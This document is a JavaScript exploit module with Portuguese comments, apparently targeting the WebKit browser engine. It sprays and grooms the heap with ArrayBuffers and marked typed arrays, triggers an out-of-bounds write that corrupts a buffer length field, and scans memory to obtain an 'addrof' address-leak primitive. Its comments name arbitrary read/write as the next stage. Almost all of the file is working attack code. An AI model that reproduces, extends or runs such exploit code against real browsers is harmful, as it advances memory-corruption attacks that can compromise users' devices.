// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R45 - Heap Grooming)
// =======================================================================================
// A alteração principal está na ETAPA 1 para implementar "Heap Grooming",
// aumentando a probabilidade de encontrar um 'leaker' adjacente ao buffer de ataque.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_read_absolute,
    oob_write_absolute,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';

// Nome do módulo atualizado para refletir a nova técnica
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R45_HeapGrooming";

// Constantes do Exploit
const VICTIM_BUFFER_SIZE = 256; 
const OOB_WRITE_VALUES_V82 = [0xABABABAB]; 
const UNIQUE_MARKER = 0x41424344;

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) { 
        return false;
    }
    const high = ptr.high();
    const low = ptr.low();
    if (high === 0 && low === 0) return false;    
    if (high === 0x7FF80000 && low === 0x0) return false;
    if ((high & 0x7FF00000) === 0x7FF00000) return false; 
    if (high === 0 && low < 0x10000) return false;
    return true;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { 
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia com Heap Grooming (R45) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R45...`;

    // Fase 0: Sanity Checks (sem alterações)
    logS3(`--- Fase 0 (R45): Sanity Checks do Core Exploit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    const coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
    if (!coreOOBReadWriteOK) {
        logS3("Sanity Check do Core Exploit FALHOU. Abortando.", 'critical', FNAME_CURRENT_TEST_BASE);
        return { errorOccurred: "Falha no selfTestOOBReadWrite do Core." };
    }
    logS3(`Sanity Check (selfTestOOBReadWrite): SUCESSO`, 'good', FNAME_CURRENT_TEST_BASE);
    await PAUSE_S3(100);

    let addrof_result = { success: false, msg: "Addrof (R45): Não iniciado.", address: null };

    try {
        // =================================================================
        // ETAPA 1: HEAP GROOMING & SPRAYING (LÓGICA ATUALIZADA)
        // =================================================================
        logS3("--- ETAPA 1 (R45): Heap Grooming & Spraying ---", "subtest");
        const GROOM_ALLOC_COUNT = 512;
        const GROOM_ALLOC_SIZE = 128 * 1024; // 128KB por buffer de grooming
        const SPRAY_COUNT = 256;
        
        // FASE 1.1: Alocar buffers para segmentar e organizar o heap
        logS3(`    Fase 1.1: Alocando ${GROOM_ALLOC_COUNT} buffers de ${GROOM_ALLOC_SIZE / 1024}KB para organizar o heap...`, "info");
        const grooming_arr = [];
        for (let i = 0; i < GROOM_ALLOC_COUNT; i++) {
            grooming_arr.push(new ArrayBuffer(GROOM_ALLOC_SIZE));
        }
        logS3("    Alocação de grooming concluída.", "info");

        // FASE 1.2: Liberar buffers intercalados para criar "buracos" previsíveis
        logS3("    Fase 1.2: Liberando buffers intercalados para criar 'buracos' no heap...", "info");
        for (let i = 0; i < GROOM_ALLOC_COUNT; i += 2) {
            grooming_arr[i] = null;
        }
        logS3("    Criação de 'buracos' concluída.", "info");
        
        // FASE 1.3: Pulverizar os 'leakers' nos buracos recém-criados
        logS3(`    Fase 1.3: Pulverizando ${SPRAY_COUNT} pares de 'leaker'/'target' nos buracos...`, "info");
        const sprayed_leakers = [];
        const sprayed_targets = [];
        for (let i = 0; i < SPRAY_COUNT; i++) {
            let leaker = new Uint32Array(8); 
            leaker[0] = UNIQUE_MARKER + i; 
            sprayed_leakers.push(leaker);
            
            let target = { index: i, a: 0x11223344, b: 0x55667788 };
            sprayed_targets.push(target);
        }
        logS3(`    Pulverização concluída. O heap está 'preparado'.`, "good");

        // ETAPA 2: Ativar a Vulnerabilidade (sem alterações)
        logS3("--- ETAPA 2 (R45): Ativando a vulnerabilidade ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(0x70, 0xFFFFFFFF, 4); // Corrompe m_length
        logS3("Vulnerabilidade ativada. Primitiva OOB (oob_read/write_absolute) está ativa.", "vuln");

        // ETAPA 3: Busca na Memória Aprimorada (com janela de busca estável)
        logS3("--- ETAPA 3 (R45): Buscando na memória por um 'leaker' (com busca estável)...", "subtest");
        let found_leaker_address = null;
        let found_leaker_index = -1;
        
        const OOB_DV_METADATA_BASE = 0x58;
        const SEARCH_START_OFFSET = OOB_DV_METADATA_BASE + 256;
        
        // PONTO DE AJUSTE CRÍTICO: Mantemos a janela de busca PEQUENA e ESTÁVEL.
        // O Heap Grooming aumenta a chance do leaker estar aqui perto.
        const SEARCH_WINDOW = 0x100000 - 0x2000; // ~1MB, com margem de segurança.

        logS3(`Iniciando busca na memória de [${toHex(SEARCH_START_OFFSET)}] até [${toHex(SEARCH_START_OFFSET + SEARCH_WINDOW)}] (janela estável)`, 'info');

        for (let offset = SEARCH_START_OFFSET; offset < SEARCH_START_OFFSET + SEARCH_WINDOW; offset += 4) {
            try {
                const val = oob_read_absolute(offset, 4);

                if ((val & 0xFFFFFF00) === (UNIQUE_MARKER & 0xFFFFFF00)) {
                    found_leaker_index = val - UNIQUE_MARKER;
                    
                    const JSCell_HEADER_OFFSET = 0x10;
                    const leaker_jscell_addr = oob_read_absolute(offset - JSCell_HEADER_OFFSET, 8);

                    if (isValidPointer(leaker_jscell_addr)) {
                        found_leaker_address = leaker_jscell_addr;
                        logS3(`MARCADOR ENCONTRADO!`, "good");
                        logS3(` -> Índice do Leaker: ${found_leaker_index}`, "good");
                        logS3(` -> Offset na busca: ${toHex(offset)}`, "good");
                        logS3(` -> Addr do Leaker (addrof): ${found_leaker_address.toString(true)}`, "vuln");
                        break;
                    }
                }
            } catch (e) { /* Ignora erros controlados, se houver. */ }
        }

        if (!found_leaker_address) {
            throw new Error("Falha ao encontrar um objeto 'leaker' mesmo com Heap Grooming. A alocação ainda é probabilística.");
        }
        
        addrof_result.success = true;
        addrof_result.msg = "Primitiva 'addrof' obtida com sucesso através de busca com Heap Grooming!";
        addrof_result.address = found_leaker_address.toString(true);
        
        logS3("--- ETAPA 4 (R45): Construindo Leitura/Escrita Arbitrária ---", "subtest");
        logS3("AVISO: Próximo passo seria usar o 'addrof' para inicializar uma classe como a 'Memory' de mem.mjs.", "warn");

    } catch (e) {
        logS3(`ERRO CRÍTICO na nova estratégia: ${e.message}`, "critical", FNAME_CURRENT_TEST_BASE);
        console.error(e);
        addrof_result.msg = `EXCEPTION: ${e.message}`;
        addrof_result.success = false;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test", FNAME_CURRENT_TEST_BASE);
    
    const best_result_for_runner = {
        errorOccurred: addrof_result.success ? null : addrof_result.msg,
        addrof_result: addrof_result,
        webkit_leak_result: { success: false, msg: "WebKit Leak pulado, foco no addrof." },
        heisenbug_on_M2_in_best_result: true
    };
    return best_result_for_runner;
}
